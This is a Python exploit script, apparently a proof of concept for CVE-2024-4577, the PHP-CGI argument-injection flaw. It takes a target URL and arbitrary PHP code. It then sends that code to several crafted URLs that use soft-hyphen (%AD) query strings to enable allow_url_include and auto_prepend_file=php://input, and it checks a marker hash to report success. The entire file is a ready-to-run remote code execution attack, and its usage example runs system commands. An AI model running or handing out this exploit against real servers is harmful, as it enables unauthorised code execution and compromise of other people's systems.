# -*- coding:utf-8 -*-
# @FileName  :exp.py
# @Time      :2024/7/3 23:01
# Author: lbb


import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests

requests.packages.urllib3.disable_warnings()
import argparse

parser = argparse.ArgumentParser(
    usage="""python CVE-2024-4577 --target http://192.168.1.1/index.php -c "<?php system('calc')?>""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True)
args = parser.parse_args()
args.target = args.target.rstrip('/')
print(args.target)
s = requests.Session()
s.verify = False

payloads = [f"{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
            f"{args.target.rstrip('/')}/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
            f"{args.target.rstrip('/')}/index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
            f"{args.target.rstrip('/')}/test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
            f"{args.target.rstrip('/')}/test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
            ]


for payload in payloads:
    res = s.post(payload,
                 data=f"{args.code};<?php echo md5('CVE-2024-4577')?>; die;")
    if '3f2ba4ab3b260f4c2dc61a6fac7c3e8a' in res.text:
        print('(+) Exploit was successful')
    else:
        print('(!) Exploit may have failed')

